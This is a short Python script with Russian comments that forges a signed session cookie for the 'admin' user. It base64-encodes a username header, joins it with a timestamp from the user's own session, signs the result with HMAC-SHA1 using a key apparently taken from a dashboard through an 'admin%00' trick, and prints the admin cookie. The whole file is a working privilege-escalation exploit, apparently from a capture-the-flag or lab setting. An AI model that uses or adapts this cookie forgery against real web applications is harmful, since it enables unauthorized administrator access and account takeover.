import hmac
import hashlib
import base64

# !!! ВСТАВЬ СЮДА НОВЫЙ КЛЮЧ ИЗ ДАШБОРДА admin%00 !!!
PRIVATE_KEY = """-----BEGIN PRIVATE KEY-----
MIIBu... (ВЕСЬ ТЕКСТ КЛЮЧА АДМИНА) ...
-----END PRIVATE KEY-----"""

# Вторая часть куки (timestamp) из твоего рабочего сеанса
TIMESTAMP_PART = "aZCbaw" 

def forge():
    # 1. Формируем чистый заголовок для admin
    header = b'{"username": "admin"}'
    part1 = base64.urlsafe_b64encode(header).decode().rstrip('=')
    
    # 2. Собираем данные
    data_to_sign = f"{part1}.{TIMESTAMP_PART}"

    # 3. Подписываем ключом админа (HMAC-SHA1)
    # Используем PRIVATE_KEY.strip() чтобы убрать лишние пробелы по краям
    signature = hmac.new(
        PRIVATE_KEY.strip().encode(), 
        data_to_sign.encode(), 
        hashlib.sha1
    ).digest()
    
    part3 = base64.urlsafe_b64encode(signature).decode().rstrip('=')

    print(f"\n[+] ТВОЯ АДМИНСКАЯ КУКА:\n{data_to_sign}.{part3}")

if __name__ == "__main__":
    forge()
